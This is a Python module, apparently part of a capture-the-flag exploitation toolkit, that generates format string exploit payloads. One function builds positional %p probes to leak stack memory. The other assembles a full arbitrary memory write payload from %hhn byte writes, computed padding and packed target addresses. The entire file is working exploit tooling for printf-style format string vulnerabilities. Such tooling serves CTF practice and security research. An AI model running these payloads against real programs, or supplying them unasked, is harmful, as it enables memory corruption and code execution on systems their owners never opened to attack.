"""Format string exploit payloads: stack leaking probes and arbitrary memory write generators."""

from __future__ import annotations

import struct
from typing import Mapping
from ctf_toolkit.binex.pwn_tools import build_format_string_probe

__all__ = ["leak_stack_offsets", "fmtstr_payload", "build_format_string_probe"]


def leak_stack_offsets(num_words: int = 10, offset_start: int = 1) -> str:
    """Generate positional format string probes to dump stack memory (%1$p.%2$p...)."""
    return build_format_string_probe(num_words=num_words, offset_start=offset_start)


def fmtstr_payload(
    offset: int,
    writes: Mapping[int, int],
    numbwritten: int = 0,
    bits: int = 64,
) -> bytes:
    """Construct an arbitrary memory write format string payload using %hhn.

    Args:
        offset: stack argument index where format string buffer starts (e.g. 6)
        writes: dict mapping target integer memory address to value to write
        numbwritten: number of bytes already printed by printf prior to our payload
        bits: 32 or 64 bit architecture (default 64)

    Returns:
        Complete raw payload with format specifier prefix, alignment padding,
        and target addresses placed at the computed stack positions.
    """
    if bits not in (32, 64):
        raise ValueError("bits must be 32 or 64")

    word_size = bits // 8
    pack_fmt = "<Q" if bits == 64 else "<I"

    # Decompose values into individual byte writes (target_addr, byte_val)
    byte_writes: list[tuple[int, int]] = []
    for raw_addr, raw_val in writes.items():
        addr = int(raw_addr, 0) if isinstance(raw_addr, str) else int(raw_addr)
        val = int(raw_val, 0) if isinstance(raw_val, str) else int(raw_val)
        val_bytes = val.to_bytes(word_size, "little")
        # Write up to highest non-zero byte
        num_bytes = max(1, (val.bit_length() + 7) // 8)
        for i in range(num_bytes):
            byte_writes.append((addr + i, val_bytes[i]))

    if not byte_writes:
        return b""

    # Sort byte writes to minimize printed chars (modulo 256)
    sorted_writes = sorted(byte_writes, key=lambda item: item[1])
    num_writes = len(sorted_writes)

    # Iteratively converge on prefix length and address offsets
    prefix_len = num_writes * (16 if bits == 64 else 12)
    fmt = ""
    pad_len = 0
    for _ in range(10):
        addr_start_offset = offset + (prefix_len + word_size - 1) // word_size
        fmt = ""
        cur = numbwritten
        for idx, (_, target_byte) in enumerate(sorted_writes):
            arg_pos = addr_start_offset + idx
            needed = (target_byte - cur) % 256
            if needed > 0:
                fmt += f"%{needed}c"
                cur = (cur + needed) % 256
            fmt += f"%{arg_pos}$hhn"

        pad_len = (word_size - (len(fmt) % word_size)) % word_size
        cand_len = len(fmt) + pad_len
        if cand_len == prefix_len:
            break
        prefix_len = cand_len

    payload = bytearray(fmt.encode("ascii") + b"\x00" * pad_len)
    for addr, _ in sorted_writes:
        payload.extend(struct.pack(pack_fmt, addr))

    return bytes(payload)
